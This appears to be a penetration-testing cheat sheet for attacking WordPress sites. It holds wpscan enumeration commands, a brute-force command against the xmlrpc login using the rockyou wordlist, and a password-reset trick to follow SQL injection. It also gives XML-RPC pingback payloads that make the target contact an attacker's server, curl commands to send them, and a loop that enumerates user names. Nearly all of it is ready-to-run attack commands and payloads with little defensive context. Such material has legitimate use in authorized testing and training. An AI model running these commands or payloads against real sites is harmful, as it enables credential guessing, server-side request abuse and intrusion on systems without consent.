# Wordpress

## Tools

```bash
# https://github.com/wpscanteam/wpscan
wpscan --url http://site.com
wpscan --url http://site.com -e ap --plugins-detection aggressive  --api-token XXX --random-user-agent  --disable-tls-checks --force
```

```bash
# Enumeration
curl -s http://site.com | grep WordPress
curl -s http://site.com/ | grep themes
curl -s http://site.com/ | grep plugins

# Login Bruteforce
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://site.com
```

<pre class="language-bash"><code class="lang-bash"><strong># Check IP behing WAF:
</strong>https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/

# SQLi in WP and can't crack users hash:
1. Request password reset.
2. Go to site.com/wp-login.php?action=rp&#x26;key={ACTIVATION_KEY}&#x26;login={USERNAME}

# XMLRPC
# https://github.com/nullfil3/xmlrpc-scan
# https://github.com/relarizky/wpxploit
# https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/

# pingback.xml:
&#x3C;?xml version="1.0" encoding="iso-8859-1"?>
&#x3C;methodCall>
&#x3C;methodName>pingback.ping&#x3C;/methodName>
&#x3C;params>
 &#x3C;param>
  &#x3C;value>
   &#x3C;string>http://10.0.0.1/hello/world&#x3C;/string>
  &#x3C;/value>
 &#x3C;/param>
 &#x3C;param>
  &#x3C;value>
   &#x3C;string>https://10.0.0.1/hello/world/&#x3C;/string>
  &#x3C;/value>
 &#x3C;/param>
&#x3C;/params>
&#x3C;/methodCall>

&#x3C;methodCall>
&#x3C;methodName>pingback.ping&#x3C;/methodName>
&#x3C;params>&#x3C;param>
&#x3C;value>&#x3C;string>http://&#x3C;YOUR SERVER >:&#x3C;port>&#x3C;/string>&#x3C;/value>
&#x3C;/param>&#x3C;param>&#x3C;value>&#x3C;string>http://&#x3C;SOME VALID BLOG FROM THE SITE >&#x3C;/string>
&#x3C;/value>&#x3C;/param>&#x3C;/params>
&#x3C;/methodCall>

# List methods:
&#x3C;methodCall>
&#x3C;methodName>system.listMethods&#x3C;/methodName>
&#x3C;params>&#x3C;/params>
&#x3C;/methodCall>

curl -X POST -d @pingback.xml https://exmaple.com/xmlrpc.php

# Evidence xmlrpc:
curl -d '&#x3C;?xml version="1.0" encoding="iso-8859-1"?>&#x3C;methodCall>&#x3C;methodName>demo.sayHello&#x3C;/methodName>&#x3C;params/>&#x3C;/methodCall>' -k https://example.com/xmlrpc.php

# Enum User:
for i in {1..50}; do curl -s -L -i https://example.com/wordpress?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; done
site.com/wp-json/wp/v2/users/

</code></pre>
